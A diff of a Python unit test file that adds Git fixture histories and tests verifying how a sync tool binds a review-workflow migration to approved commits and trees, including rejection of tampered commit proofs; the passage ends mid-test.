@@ -1,6 +1,7 @@
 from __future__ import annotations
 
 import base64
+import dataclasses
 import datetime as dt
 import contextlib
 import errno
@@ -15,6 +16,7 @@ import re
 import shlex
 import shutil
 import stat
+import subprocess
 import sys
 import tempfile
 from types import SimpleNamespace
@@ -65,8 +67,7 @@ def _is_legacy_review_source_pin(
     matches = [
         source
         for source in sources
-        if isinstance(source, dict)
-        and source.get("name") == "codex-review-workflows"
+        if isinstance(source, dict) and source.get("name") == "codex-review-workflows"
     ]
     if len(matches) != 1:
         return False
@@ -105,6 +106,57 @@ RUNTIME_MODULE = load_module("codex_personal_sync_private_overlay_sync", RUNTIME
 def _final_personal_agents_text() -> str:
     data = (REPO_ROOT / SYNC_MODULE.PERSONAL_AGENTS_TARGET).read_bytes()
     return SYNC_MODULE._migrated_personal_agents_bytes(data).decode("utf-8")
+
+
+def _synthetic_complete_checkout_receipt(source_root: Path, pins: tuple[object, ...]):
+    def file_state(path: Path):
+        return SimpleNamespace(
+            path=path,
+            object_identity=(1, 5, stat.S_IFREG),
+            access_policy=(os.getuid(), 0o644, 1),
+            size=1,
+            sha256="f" * 64,
+        )
+
+    return SimpleNamespace(
+        source_root=source_root,
+        source_root_binding=(1, 1, os.getuid(), 0o700),
+        pins=pins,
+        checkouts=tuple(
+            SimpleNamespace(
+                name=pin.name,
+                repository=pin.repository,
+                checkout=source_root / pin.name,
+                checkout_binding=(1, 2, 3, 0o700),
+                git_directory=source_root / pin.name / ".git",
+                git_directory_binding=(1, 3, 3, 0o700),
+                objects_directory=source_root / pin.name / ".git" / "objects",
+                objects_directory_binding=(1, 4, 3, 0o700),
+                head=pin.sha,
+                tree=pin.tree,
+                head_file=file_state(source_root / pin.name / ".git" / "HEAD"),
+                local_config_file=file_state(
+                    source_root / pin.name / ".git" / "config"
+                ),
+                shallow=False,
+                bare=False,
+                detached_head=True,
+                clean_worktree_and_index=True,
+                promisor_or_partial_clone_absent=True,
+                alternates_absent=True,
+                grafts_absent=True,
+                replace_refs_absent=True,
+                sparse_checkout_absent=True,
+                unsafe_config_absent=True,
+                tracked_modes_and_index_flags_safe=True,
+                object_closure_complete=True,
+                strict_fsck_complete=True,
+                safety_contract="private-overlay-complete-checkout-safety-v1",
+            )
+            for pin in pins
+        ),
+        safety_contract="private-overlay-complete-checkout-safety-v1",
+    )
 
 
 # isolated_review synthetic-token IDs: access-a and access-b.
@@ -765,6 +817,41 @@ class PrivateOverlaySyncTests(unittest.TestCase):
         target.chmod(0o644)
         return target, data, hashlib.sha256(legacy_block).hexdigest()
 
+    def _migrate_personal_agents_after_first_read(self, action):
+        agents, legacy, legacy_digest = self._synthetic_legacy_personal_agents()
+        real_read = SYNC_MODULE._read_regular_file_overlay_descriptor
+        action_ran = False
+
+        def read_then_act(descriptor, *, byte_limit):
+            nonlocal action_ran
+            data = real_read(descriptor, byte_limit=byte_limit)
+            if not action_ran and data == legacy:
+                action_ran = True
+                action(agents, legacy)
+            return data
+
+        with contextlib.ExitStack() as stack:
+            repo_binding = SYNC_MODULE._pin_regular_file_overlay_directory(
+                stack,
+                self.repo_root,
+                label="repository root",
+            )
+            with (
+                mock.patch.object(
+                    SYNC_MODULE,
+                    "PERSONAL_AGENTS_LEGACY_REVIEW_BLOCK_SHA256",
+                    legacy_digest,
+                ),
+                mock.patch.object(
+                    SYNC_MODULE,
+                    "_read_regular_file_overlay_descriptor",
+                    side_effect=read_then_act,
+                ),
+            ):
+                result = SYNC_MODULE._migrate_personal_agents_guidance(repo_binding)
+        self.assertTrue(action_ran)
+        return agents, legacy, result
+
     def _write_current_bug_triage_source(
         self,
         *,
@@ -782,10 +869,7 @@ class PrivateOverlaySyncTests(unittest.TestCase):
         script_replacements: tuple[tuple[str, str], ...] = (),
     ):
         source = (
-            self.source_root
-            / "codex-debug-triage"
-            / "skills"
-            / "bug-triage-playbook"
+            self.source_root / "codex-debug-triage" / "skills" / "bug-triage-playbook"
         )
         scripts = source / "scripts"
         references = source / "references"
@@ -806,7 +890,7 @@ class PrivateOverlaySyncTests(unittest.TestCase):
             encoding="utf-8",
         )
         interface = (
-            'interface:\n'
+            "interface:\n"
             '  display_name: "Bounded Artifact Transport"\n'
             '  short_description: "Load and route bounded Jenkins-style artifact transport."\n'
             '  default_prompt: "Use $bug-triage-playbook only to route an exact remote artifact URL or local ZIP through the bounded transport helper, then return the artifact evidence to the task\'s primary diagnostic workflow."\n'
@@ -824,13 +908,13 @@ class PrivateOverlaySyncTests(unittest.TestCase):
             f"{recipes_scope}\n\n"
             "```bash\n"
             "helper=example\n"
-            "python3 \"$helper\" probe-url \\\n"
+            'python3 "$helper" probe-url \\\n'
             "  'https://jenkins.example.com/job/example/42/api/json' \\\n"
             "  --auth-profile default\n"
-            "python3 \"$helper\" show-url \\\n"
+            'python3 "$helper" show-url \\\n'
             "  'https://jenkins.example.com/job/example/42/consoleText' \\\n"
             "  --auth-profile default\n"
-            "python3 \"$helper\" fetch-url \\\n"
+            'python3 "$helper" fetch-url \\\n'
             "  'https://jenkins.example.com/job/example/42/artifact/logs.zip' \\\n"
             "  --auth-profile default\n"
             "```\n",
@@ -852,9 +936,7 @@ class PrivateOverlaySyncTests(unittest.TestCase):
             SYNC_MODULE.PUBLIC_BUG_TRIAGE_CONFIG_BLOCK,
             1,
         )
-        private_host_condition = (
-            "if parsed.hostname.lower() not in ALLOWED_HOSTS:"
-        )
+        private_host_condition = "if parsed.hostname.lower() not in ALLOWED_HOSTS:"
         self.assertEqual(helper.count(private_host_condition), 1)
         helper = helper.replace(private_host_condition, host_condition, 1)
         reverse_private_transforms = (
@@ -922,6 +1004,11 @@ class PrivateOverlaySyncTests(unittest.TestCase):
         self,
         rule: SYNC_MODULE.SyncRule,
         source: Path,
+        *,
+        source_pin=None,
+        migration_receipt=None,
+        checkout_verification=None,
+        root_object_id: str = "a" * 40,
     ) -> dict[tuple[str, Path], SYNC_MODULE._LockedRuleSource]:
         checkout = self.source_root / rule.repo
         entries = []
@@ -955,16 +1042,386 @@ class PrivateOverlaySyncTests(unittest.TestCase):
             self.assertEqual(locked_checkout, checkout)
             return blobs[object_id]
 
+        if checkout_verification is None:
+            checkout_verification = self._complete_checkout_verification(
+                SimpleNamespace(
+                    name=rule.repo,
+                    repository=(
+                        source_pin.repository
+                        if source_pin is not None
+                        else f"Joey-Tools/{rule.repo}"
+                    ),
+                    sha=(source_pin.revision if source_pin is not None else "a" * 40),
+                    tree=(
+                        source_pin.root_tree
+                        if source_pin is not None
+                        else root_object_id
+                    ),
+                )
+            )
         return {
             (rule.repo, rule.source): SYNC_MODULE._LockedRuleSource(
                 checkout=checkout,
                 manifest=SimpleNamespace(
                     root_kind="tree",
+                    root_object_id=root_object_id,
                     entries=tuple(entries),
                 ),
                 read_blob=read_blob,
+                source_pin=source_pin,
+                canonical_review_migration_receipt=migration_receipt,
+                prewrite_checkout_verification=checkout_verification,
             )
         }
+
+    def _complete_checkout_verification(self, *pins, source_root=None):
+        checkout_root = self.source_root if source_root is None else source_root
+        pin_records = tuple(
+            (pin.name, pin.repository, pin.sha, pin.tree) for pin in pins
+        )
+        source_lock = SimpleNamespace(
+            pins=tuple(pins),
+            digest=hashlib.sha256(repr(pin_records).encode("utf-8")).hexdigest(),
+        )
+
+        def structured_receipt(*_args, **_kwargs):
+            return _synthetic_complete_checkout_receipt(
+                checkout_root,
+                source_lock.pins,
+            )
+
+        source_lock_module = SimpleNamespace(
+            load_source_lock=lambda _repo_root: source_lock,
+            verify_checkouts=structured_receipt,
+        )
+        return SYNC_MODULE._verify_complete_checkouts(
+            source_lock_module,
+            checkout_root,
+            source_lock,
+            repo_root=self.repo_root,
+        )
+
+    def _locked_canonical_review_source(
+        self,
+        rule: SYNC_MODULE.SyncRule,
+        source: Path,
+        *,
+        legacy: bool = False,
+    ) -> dict[tuple[str, Path], SYNC_MODULE._LockedRuleSource]:
+        policy = SYNC_MODULE.CANONICAL_REVIEW_MIGRATION_POLICY
+        if legacy:
+            source_pin = SYNC_MODULE._VerifiedLockedSourcePin(
+                repository=policy.repository,
+                revision=policy.legacy_revision,
+                root_tree=policy.legacy_root_tree,
+            )
+            receipt = None
+            root_object_id = "b" * 40
+        else:
+            source_pin = SYNC_MODULE._VerifiedLockedSourcePin(
+                repository=policy.repository,
+                revision="a" * 40,
+                root_tree=policy.approved_root_tree,
+            )
+            root_object_id = policy.approved_review_subtree_tree
+            receipt = SYNC_MODULE._CanonicalReviewMigrationReceipt(
+                policy=policy,
+                source_pin=source_pin,
+                live_review_subtree_tree=root_object_id,
+                activation_basis="exact-approved-root-tree",
+            )
+        checkout_verification = self._complete_checkout_verification(
+            SimpleNamespace(
+                name=rule.repo,
+                repository=source_pin.repository,
+                sha=source_pin.revision,
+                tree=source_pin.root_tree,
+            )
+        )
+        return self._locked_bug_triage_source(
+            rule,
+            source,
+            source_pin=source_pin,
+            migration_receipt=receipt,
+            checkout_verification=checkout_verification,
+            root_object_id=root_object_id,
+        )
+
+    def _fixture_git(self, repository: Path, *arguments: str) -> str:
+        environment = {
+            "PATH": os.environ.get("PATH", "/usr/bin:/bin"),
+            "LANG": "C",
+            "LC_ALL": "C",
+            "GIT_CONFIG_NOSYSTEM": "1",
+            "GIT_CONFIG_GLOBAL": "/dev/null",
+            "GIT_NO_LAZY_FETCH": "1",
+            "GIT_OPTIONAL_LOCKS": "0",
+            "GIT_TERMINAL_PROMPT": "0",
+        }
+        completed = subprocess.run(
+            [
+                "git",
+                "-c",
+                "core.fsmonitor=false",
+                "-c",
+                "core.hooksPath=/dev/null",
+                "-c",
+                "commit.gpgsign=false",
+                "-c",
+                "user.name=Private Overlay Test",
+                "-c",
+                "user.email=private-overlay-test@example.invalid",
+                "-C",
+                str(repository),
+                *arguments,
+            ],
+            env=environment,
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            check=False,
+        )
+        if completed.returncode != 0:
+            self.fail(
+                f"fixture Git command failed ({arguments[0]}): "
+                f"{completed.stderr.decode('utf-8', errors='replace')}"
+            )
+        return completed.stdout.decode("ascii").strip()
+
+    def _fixture_git_bytes(self, repository: Path, *arguments: str) -> bytes:
+        environment = {
+            "PATH": os.environ.get("PATH", "/usr/bin:/bin"),
+            "LANG": "C",
+            "LC_ALL": "C",
+            "GIT_CONFIG_NOSYSTEM": "1",
+            "GIT_CONFIG_GLOBAL": "/dev/null",
+            "GIT_NO_LAZY_FETCH": "1",
+            "GIT_OPTIONAL_LOCKS": "0",
+            "GIT_TERMINAL_PROMPT": "0",
+        }
+        completed = subprocess.run(
+            ["git", "-C", str(repository), *arguments],
+            env=environment,
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            check=False,
+        )
+        if completed.returncode != 0:
+            self.fail(
+                f"fixture Git command failed ({arguments[0]}): "
+                f"{completed.stderr.decode('utf-8', errors='replace')}"
+            )
+        return completed.stdout
+
+    def _canonical_migration_history(self):
+        checkout = self.root / "canonical-migration-history"
+        checkout.mkdir()
+        self._fixture_git(checkout, "init", "--quiet")
+        review_root = checkout / "skills" / "review-orchestration-playbook"
+        review_root.mkdir(parents=True)
+        (review_root / "SKILL.md").write_text("legacy\n", encoding="utf-8")
+        (checkout / "repository.txt").write_text("common\n", encoding="utf-8")
+        self._fixture_git(checkout, "add", ".")
+        self._fixture_git(checkout, "commit", "--quiet", "-m", "common")
+        common = self._fixture_git(checkout, "rev-parse", "HEAD")
+
+        self._fixture_git(checkout, "switch", "--quiet", "-c", "candidate")
+        (review_root / "SKILL.md").write_text("approved\n", encoding="utf-8")
+        (checkout / "repository.txt").write_text("approved\n", encoding="utf-8")
+        self._fixture_git(checkout, "add", ".")
+        self._fixture_git(checkout, "commit", "--quiet", "-m", "candidate")
+        candidate = self._fixture_git(checkout, "rev-parse", "HEAD")
+        approved_root_tree = self._fixture_git(
+            checkout,
+            "rev-parse",
+            f"{candidate}^{{tree}}",
+        )
+        approved_review_subtree_tree = self._fixture_git(
+            checkout,
+            "rev-parse",
+            f"{candidate}:skills/review-orchestration-playbook",
+        )
+
+        self._fixture_git(checkout, "switch", "--quiet", "-c", "squash", common)
+        (review_root / "SKILL.md").write_text("approved\n", encoding="utf-8")
+        (checkout / "repository.txt").write_text("approved\n", encoding="utf-8")
+        self._fixture_git(checkout, "add", ".")
+        self._fixture_git(checkout, "commit", "--quiet", "-m", "squash")
+        squash = self._fixture_git(checkout, "rev-parse", "HEAD")
+        self.assertNotEqual(squash, candidate)
+        self.assertEqual(
+            self._fixture_git(checkout, "rev-parse", f"{squash}^{{tree}}"),
+            approved_root_tree,
+        )
+
+        self._fixture_git(checkout, "switch", "--quiet", "-c", "future", squash)
+        (checkout / "future-a.txt").write_text("future a\n", encoding="utf-8")
+        self._fixture_git(checkout, "add", ".")
+        self._fixture_git(checkout, "commit", "--quiet", "-m", "future a")
+        self._fixture_git(checkout, "switch", "--quiet", "-c", "side", squash)
+        (checkout / "future-b.txt").write_text("future b\n", encoding="utf-8")
+        self._fixture_git(checkout, "add", ".")
+        self._fixture_git(checkout, "commit", "--quiet", "-m", "future b")
+        self._fixture_git(checkout, "switch", "--quiet", "future")
+        self._fixture_git(
+            checkout,
+            "merge",
+            "--quiet",
+            "--no-ff",
+            "side",
+            "-m",
+            "future merge",
+        )
+        future_merge = self._fixture_git(checkout, "rev-parse", "HEAD")
+
+        self._fixture_git(checkout, "switch", "--quiet", "-c", "fork", common)
+        (review_root / "SKILL.md").write_text("approved\n", encoding="utf-8")
+        (checkout / "repository.txt").write_text("fork\n", encoding="utf-8")
+        self._fixture_git(checkout, "add", ".")
+        self._fixture_git(checkout, "commit", "--quiet", "-m", "fork")
+        fork = self._fixture_git(checkout, "rev-parse", "HEAD")
+
+        self._fixture_git(
+            checkout,
+            "switch",
+            "--quiet",
+            "-c",
+            "changed-subtree",
+            squash,
+        )
+        (review_root / "SKILL.md").write_text("changed\n", encoding="utf-8")
+        self._fixture_git(checkout, "add", ".")
+        self._fixture_git(
+            checkout,
+            "commit",
+            "--quiet",
+            "-m",
+            "changed subtree",
+        )
+        changed_subtree = self._fixture_git(checkout, "rev-parse", "HEAD")
+
+        self._fixture_git(checkout, "switch", "--quiet", "-c", "moved-base", common)
+        (checkout / "base-move.txt").write_text("moved base\n", encoding="utf-8")
+        self._fixture_git(checkout, "add", ".")
+        self._fixture_git(checkout, "commit", "--quiet", "-m", "moved base")
+        (review_root / "SKILL.md").write_text("approved\n", encoding="utf-8")
+        (checkout / "repository.txt").write_text("approved\n", encoding="utf-8")
+        self._fixture_git(checkout, "add", ".")
+        self._fixture_git(
+            checkout,
+            "commit",
+            "--quiet",
+            "-m",
+            "base-move squash",
+        )
+        base_move_squash = self._fixture_git(checkout, "rev-parse", "HEAD")
+        self.assertEqual(
+            self._fixture_git(
+                checkout,
+                "rev-parse",
+                f"{base_move_squash}:skills/review-orchestration-playbook",
+            ),
+            approved_review_subtree_tree,
+        )
+        self.assertNotEqual(
+            self._fixture_git(
+                checkout,
+                "rev-parse",
+                f"{base_move_squash}^{{tree}}",
+            ),
+            approved_root_tree,
+        )
+
+        policy = SYNC_MODULE.CanonicalReviewMigrationPolicy(
+            repository="Joey-Tools/codex-review-workflows",
+            reviewed_candidate_revision=candidate,
+            reviewed_candidate_commit_payload_base64=base64.b64encode(
+                self._fixture_git_bytes(
+                    checkout,
+                    "cat-file",
+                    "commit",
+                    candidate,
+                )
+            ).decode("ascii"),
+            approved_root_tree=approved_root_tree,
+            approved_review_subtree_tree=approved_review_subtree_tree,
+            legacy_revision=common,
+            legacy_root_tree=self._fixture_git(
+                checkout,
+                "rev-parse",
+                f"{common}^{{tree}}",
+            ),
+        )
+        canonical = SYNC_MODULE._CANONICAL_REVIEW_SYNC_RULE
+        rule = SYNC_MODULE.SyncRule(
+            repo=canonical.repo,
+            source=canonical.source,
+            target=canonical.target,
+            replacements=canonical.replacements,
+            text_extensions=canonical.text_extensions,
+            exclude_names=canonical.exclude_names,
+            forbidden_residuals=canonical.forbidden_residuals,
+            regular_file_overlays=canonical.regular_file_overlays,
+            replacement_excluded_paths=canonical.replacement_excluded_paths,
+            canonical_review_migration_policy=policy,
+        )
+        return SimpleNamespace(
+            checkout=checkout,
+            rule=rule,
+            policy=policy,
+            candidate=candidate,
+            squash=squash,
+            future_merge=future_merge,
+            fork=fork,
+            changed_subtree=changed_subtree,
+            base_move_squash=base_move_squash,
+        )
+
+    def _verified_migration_fixture_pin(self, history, revision: str):
+        self._fixture_git(history.checkout, "switch", "--quiet", "--detach", revision)
+        git_path = SOURCE_LOCK_MODULE._trusted_git_path()
+        return SOURCE_LOCK_MODULE._verify_checkout(
+            git_path,
+            history.checkout,
+            name="codex-review-workflows",
+            repository=history.policy.repository,
+            expected=None,
+        )
+
+    def _bind_migration_fixture(self, history, pin, *, complete: bool = True):
+        subtree_tree = self._fixture_git(
+            history.checkout,
+            "rev-parse",
+            f"{pin.sha}:{history.rule.source.as_posix()}",
+        )
+        manifest = SimpleNamespace(root_object_id=subtree_tree)
+        verification = (
+            self._complete_checkout_verification(
+                SimpleNamespace(
+                    name=history.checkout.name,
+                    repository=pin.repository,
+                    sha=pin.sha,
+                    tree=pin.tree,
+                ),
+                source_root=history.checkout.parent,
+            )
+            if complete
+            else True
+        )
+        with mock.patch.object(
+            SYNC_MODULE,
+            "_CANONICAL_REVIEW_SYNC_RULE",
+            history.rule,
+        ):
+            return SYNC_MODULE._bind_canonical_review_migration_source(
+                SOURCE_LOCK_MODULE,
+                history.checkout,
+                pin,
+                manifest,
+                history.rule,
+                complete_checkout_verification=verification,
+            )
 
     def test_sync_rule_copies_and_transforms_text(self) -> None:
         source = self.source_root / "example-repo" / "skill" / "SKILL.md"
@@ -1082,22 +1539,27 @@ class PrivateOverlaySyncTests(unittest.TestCase):
         private_catalog = self.repo_root / review_rule.regular_file_overlays[0].source
         private_catalog.parent.mkdir(parents=True)
         private_catalog.write_bytes(b'{"pool":"private"}\n')
-        agents, legacy_agents, legacy_digest = (
-            self._synthetic_legacy_personal_agents()
-        )
+        agents, legacy_agents, legacy_digest = self._synthetic_legacy_personal_agents()
 
         with mock.patch.object(
             SYNC_MODULE,
             "PERSONAL_AGENTS_LEGACY_REVIEW_BLOCK_SHA256",
             legacy_digest,
         ):
-            expected_agents = SYNC_MODULE._migrated_personal_agents_bytes(
-                legacy_agents
+            expected_agents = SYNC_MODULE._migrated_personal_agents_bytes(legacy_agents)
+            SYNC_MODULE.sync_sources(
+                self.repo_root,
+                self.source_root,
+                (review_rule,),
+                locked_sources=self._locked_canonical_review_source(
+                    review_rule,
+                    source,
+                ),
             )
             SYNC_MODULE.sync_sources(
                 self.repo_root,
                 self.source_root,
-                (review_rule, ci_rule),
+                (ci_rule,),
             )
 
         live_ci = self.repo_root / ci_rule.target
@@ -1427,6 +1889,476 @@ class PrivateOverlaySyncTests(unittest.TestCase):
             frozenset(),
         )
 
+    def test_canonical_review_migration_policy_binds_candidate_commit_and_trees(
+        self,
+    ) -> None:
+        policy = SYNC_MODULE.CANONICAL_REVIEW_MIGRATION_POLICY
+        payload = SYNC_MODULE._validate_reviewed_candidate_commit_proof(policy)
+        self.assertEqual(
+            hashlib.sha1(
+                f"commit {len(payload)}\0".encode("ascii") + payload,
+                usedforsecurity=False,
+            ).hexdigest(),
+            policy.reviewed_candidate_revision,
+        )
+        self.assertEqual(
+            policy.reviewed_candidate_revision,
+            "cd5ccd2ddd2a0975db6c5286765d4aab838bc736",
+        )
+        self.assertEqual(
+            policy.approved_root_tree,
+            "aef4bef7a45adab762a1b671da48fbc2d1f44064",
+        )
+        self.assertEqual(
+            policy.approved_review_subtree_tree,
+            "6dab70713244598e3aaaa132eb082211b348bcdf",
+        )
+
+    def test_canonical_review_migration_accepts_same_tree_squash(self) -> None:
+        history = self._canonical_migration_history()
+        pin = self._verified_migration_fixture_pin(history, history.squash)
+
+        source_pin, receipt = self._bind_migration_fixture(history, pin)
+
+        self.assertNotEqual(source_pin.revision, history.candidate)
+        self.assertEqual(source_pin.root_tree, history.policy.approved_root_tree)
+        self.assertIsNotNone(receipt)
+        self.assertEqual(receipt.activation_basis, "exact-approved-root-tree")
+
+    def test_canonical_review_migration_accepts_squash_after_candidate_prune(
+        self,
+    ) -> None:
+        history = self._canonical_migration_history()
+        self._fixture_git(history.checkout, "branch", "-D", "candidate")
+        self._fixture_git(
+            history.checkout,
+            "reflog",
+            "expire",
+            "--expire=now",
+            "--all",
+        )
+        self._fixture_git(history.checkout, "gc", "--prune=now")
+        missing = subprocess.run(
+            [
+                "git",
+                "-C",
+                str(history.checkout),
+                "cat-file",
+                "-e",
+                f"{history.candidate}^{{commit}}",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            check=False,
+        )
+        self.assertNotEqual(missing.returncode, 0)
+        pin = self._verified_migration_fixture_pin(history, history.squash)
+
+        source_pin, receipt = self._bind_migration_fixture(history, pin)
+
+        self.assertEqual(source_pin.root_tree, history.policy.approved_root_tree)
+        self.assertEqual(receipt.activation_basis, "exact-approved-root-tree")
+
+        descendant_pin = self._verified_migration_fixture_pin(
+            history,
+            history.future_merge,
+        )
+        descendant_source, descendant_receipt = self._bind_migration_fixture(
+            history,
+            descendant_pin,
+        )
+        self.assertEqual(descendant_source.revision, history.future_merge)
+        self.assertEqual(
+            descendant_receipt.activation_basis,
+            "bounded-approved-root-tree-ancestor",
+        )
+
+    def test_legacy_source_accepts_offline_commit_proof_without_approved_tree(
+        self,
+    ) -> None:
+        history = self._canonical_migration_history()
+        self._fixture_git(
+            history.checkout,
+            "switch",
+            "--quiet",
+            "--detach",
+            history.policy.legacy_revision,
+        )
+        branches = self._fixture_git(
+            history.checkout,
+            "for-each-ref",
+            "--format=%(refname:short)",
+            "refs/heads",
+        ).splitlines()
+        for branch in branches:
+            self._fixture_git(history.checkout, "branch", "-D", branch)
+        self._fixture_git(
+            history.checkout,
+            "reflog",
+            "expire",
+            "--expire=now",
+            "--all",
+        )
+        self._fixture_git(history.checkout, "gc", "--prune=now")
+        missing_tree = subprocess.run(
+            [
+                "git",
+                "-C",
+                str(history.checkout),
+                "cat-file",
+                "-e",
+                f"{history.policy.approved_root_tree}^{{tree}}",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            check=False,
+        )
+        self.assertNotEqual(missing_tree.returncode, 0)
+        pin = self._verified_migration_fixture_pin(
+            history,
+            history.policy.legacy_revision,
+        )
+
+        source_pin, receipt = self._bind_migration_fixture(history, pin)
+
+        self.assertEqual(source_pin.revision, history.policy.legacy_revision)
+        self.assertIsNone(receipt)
+
+    def test_legacy_source_rejects_tampered_offline_commit_proof(self) -> None:
+        history = self._canonical_migration_history()
+        pin = self._verified_migration_fixture_pin(
+            history,
+            history.policy.legacy_revision,
+        )
+        payload = base64.b64decode(
+            history.policy.reviewed_candidate_commit_payload_base64,
+            validate=True,
+        )
+        policy = dataclasses.replace(
+            history.policy,
+            reviewed_candidate_commit_payload_base64=base64.b64encode(
+                payload + b"tampered"
+            ).decode("ascii"),
+        )
+        altered = SimpleNamespace(
+            **{
+                **vars(history),
+                "policy": policy,
+                "rule": dataclasses.replace(
+                    history.rule,
+                    canonical_review_migration_policy=policy,
+                ),
+            }
+        )
+
+        with self.assertRaisesRegex(
+            SYNC_MODULE.SyncError,
+            "commit proof differs",
+        ):
+            self._bind_migration_fixture(altered, pin)
+
+    def test_nonlegacy_source_rejects_missing_approved_tree_object(self) -> None:
+        history = self._canonical_migration_history()
+        pin = self._verified_migration_fixture_pin(history, history.future_merge)
+        tree_object = (
+            history.checkout
+            / ".git"
+            / "objects"
+            / history.policy.approved_root_tree[:2]
+            / history.policy.approved_root_tree[2:]
+        )
+        self.assertTrue(tree_object.is_file())
+        tree_object.unlink()
+
+        with self.assertRaises(SOURCE_LOCK_MODULE.SourceLockError):
+            self._bind_migration_fixture(history, pin)
+
+    def test_canonical_review_migration_rejects_invalid_candidate_proofs(
+        self,
+    ) -> None:
+        history = self._canonical_migration_history()
+        pin = self._verified_migration_fixture_pin(history, history.squash)
+        payload = base64.b64decode(
+            history.policy.reviewed_candidate_commit_payload_base64,
+            validate=True,
+        )
+        cases = {
+            "missing": dataclasses.replace(
+                history.policy,
+                reviewed_candidate_commit_payload_base64="",
+            ),
+            "tampered": dataclasses.replace(
+                history.policy,
+                reviewed_candidate_commit_payload_base64=base64.b64encode(
+                    payload + b"tampered"
+                ).decode("ascii"),
+            ),
+            "wrong candidate": dataclasses.replace(
+                history.policy,
+                reviewed_candidate_revision="f" * 40,
+            ),
+            "wrong root": dataclasses.replace(
+                history.policy,
+                approved_root_tree="e" * 40,
+            ),
+            "wrong subtree": dataclasses.replace(
+                history.policy,
+                approved_review_subtree_tree="d" * 40,
+            ),
+        }
+        for label, policy in cases.items():
+            rule = dataclasses.replace(
+                history.rule,
+                canonical_review_migration_policy=policy,
+            )
+            altered = SimpleNamespace(
+                **{**vars(history), "policy": policy, "rule": rule}
+            )
+            with self.subTest(label=label), self.assertRaises(SYNC_MODULE.SyncError):
+                self._bind_migration_fixture(altered, pin)
+
+    def test_canonical_review_migration_accepts_bounded_merge_descendant(
+        self,
+    ) -> None:
+        history = self._canonical_migration_history()
+        pin = self._verified_migration_fixture_pin(history, history.future_merge)
+        self.assertNotEqual(pin.tree, history.policy.approved_root_tree)
+
+        source_pin, receipt = self._bind_migration_fixture(history, pin)
+
+        self.assertEqual(source_pin.revision, history.future_merge)
+        self.assertIsNotNone(receipt)
+        self.assertEqual(
+            receipt.activation_basis,
+            "bounded-approved-root-tree-ancestor",
+        )
+
+    def test_canonical_review_migration_rejects_non_descendant(self) -> None:
+        history = self._canonical_migration_history()
+        pin = self._verified_migration_fixture_pin(history, history.fork)
+        self.assertNotEqual(pin.tree, history.policy.approved_root_tree)
+
+        with self.assertRaisesRegex(
+            SYNC_MODULE.SyncError,
+            "anchor-refresh-required",
+        ):
+            self._bind_migration_fixture(history, pin)
+
+    def test_canonical_review_migration_base_move_requires_anchor_refresh(
+        self,
+    ) -> None:
+        history = self._canonical_migration_history()
+        pin = self._verified_migration_fixture_pin(
+            history,
+            history.base_move_squash,
+        )
+        self.assertNotEqual(pin.tree, history.policy.approved_root_tree)
+        self.assertEqual(
+            self._fixture_git(
+                history.checkout,
+                "rev-parse",
+                f"{pin.sha}:{history.rule.source.as_posix()}",
+            ),
+            history.policy.approved_review_subtree_tree,
+        )
+
+        with self.assertRaisesRegex(
+            SYNC_MODULE.SyncError,
+            "anchor-refresh-required",
+        ):
+            self._bind_migration_fixture(history, pin)
+
+        refreshed_policy = SYNC_MODULE.CanonicalReviewMigrationPolicy(
+            repository=history.policy.repository,
+            reviewed_candidate_revision=pin.sha,
+            reviewed_candidate_commit_payload_base64=base64.b64encode(
+                self._fixture_git_bytes(
+                    history.checkout,
+                    "cat-file",
+                    "commit",
+                    pin.sha,
+                )
+            ).decode("ascii"),
+            approved_root_tree=pin.tree,
+            approved_review_subtree_tree=(history.policy.approved_review_subtree_tree),
+            legacy_revision=history.policy.legacy_revision,
+            legacy_root_tree=history.policy.legacy_root_tree,
+        )
+        refreshed_rule = SYNC_MODULE.SyncRule(
+            repo=history.rule.repo,
+            source=history.rule.source,
+            target=history.rule.target,
+            replacements=history.rule.replacements,
+            text_extensions=history.rule.text_extensions,
+            exclude_names=history.rule.exclude_names,
+            forbidden_residuals=history.rule.forbidden_residuals,
+            regular_file_overlays=history.rule.regular_file_overlays,
+            replacement_excluded_paths=history.rule.replacement_excluded_paths,
+            canonical_review_migration_policy=refreshed_policy,
+        )
+        refreshed = SimpleNamespace(
+            **{
+                **vars(history),
+                "policy": refreshed_policy,
+                "rule": refreshed_rule,
+            }
+        )
+
+        source_pin, receipt = self._bind_migration_fixture(refreshed, pin)
+
+        self.assertEqual(source_pin.root_tree, refreshed_policy.approved_root_tree)
+        self.assertIsNotNone(receipt)
+        self.assertEqual(receipt.activation_basis, "exact-approved-root-tree")
+
+    def test_pruned_base_move_squash_reports_anchor_refresh_required(
+        self,
+    ) -> None:
+        history = self._canonical_migration_history()
+        self._fixture_git(
+            history.checkout,
+            "switch",
+            "--quiet",
+            "--detach",
+            history.base_move_squash,
+        )
+        branches = self._fixture_git(
+            history.checkout,
+            "for-each-ref",
+            "--format=%(refname:short)",
+            "refs/heads",
+        ).splitlines()
+        for branch in branches:
+            self._fixture_git(history.checkout, "branch", "-D", branch)
+        self._fixture_git(
+            history.checkout,
+            "reflog",
+            "expire",
+            "--expire=now",
+            "--all",
+        )
+        self._fixture_git(history.checkout, "gc", "--prune=now")
+        missing_tree = subprocess.run(
+            [
+                "git",
+                "-C",
+                str(history.checkout),
+                "cat-file",
+                "-e",
+                f"{history.policy.approved_root_tree}^{{tree}}",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            check=False,
+        )
+        self.assertNotEqual(missing_tree.returncode, 0)
+        pin = self._verified_migration_fixture_pin(
+            history,
+            history.base_move_squash,
+        )
+
+        with self.assertRaisesRegex(
+            SYNC_MODULE.SyncError,
+            "anchor-refresh-required",
+        ):
+            self._bind_migration_fixture(history, pin)
+
+    def test_canonical_review_migration_rejects_changed_review_subtree(
+        self,
+    ) -> None:
+        history = self._canonical_migration_history()
+        pin = self._verified_migration_fixture_pin(history, history.changed_subtree)
+
+        with self.assertRaisesRegex(
+            SYNC_MODULE.SyncError,
+            "live subtree is not approved",
+        ):
+            self._bind_migration_fixture(history, pin)
+
+    def test_canonical_review_migration_rejects_wrong_locked_sha_or_tree(
+        self,
+    ) -> None:
+        history = self._canonical_migration_history()
